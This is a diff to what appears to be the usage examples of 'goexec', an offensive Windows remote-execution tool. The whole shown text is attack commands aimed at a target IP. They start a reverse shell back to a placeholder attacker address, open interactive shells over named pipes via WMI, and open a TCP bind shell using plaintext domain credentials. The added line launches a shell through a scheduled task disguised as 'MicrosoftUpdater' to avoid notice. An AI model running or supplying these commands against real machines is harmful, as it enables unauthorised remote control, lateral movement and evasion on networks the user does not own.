@@ -73,8 +73,8 @@ goexec.exe -target 192.168.19.154 -method tcp -port 9999 -reverse -ip YOUR.LOCAL
 # Enter an interactive shell via named pipe launched via WMI
 goexec.exe -target 192.168.19.154 -method pipe
 
-# Enter an interactive shell via named pipe launched via WMI
-goexec.exe -target 192.168.19.154 -method 
+# Enter an interactive shell via named pipe launched via Scheduled Task
+goexec.exe -target 192.168.19.154 -method pipe -dropmethod task -name MicrosoftUpdater -description "P2PServiceUpdater"
 
 # Enter interactive bind shell via TCP launched via WMI
 goexec.exe -target 192.168.19.154 -method tcp -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL -port 5555
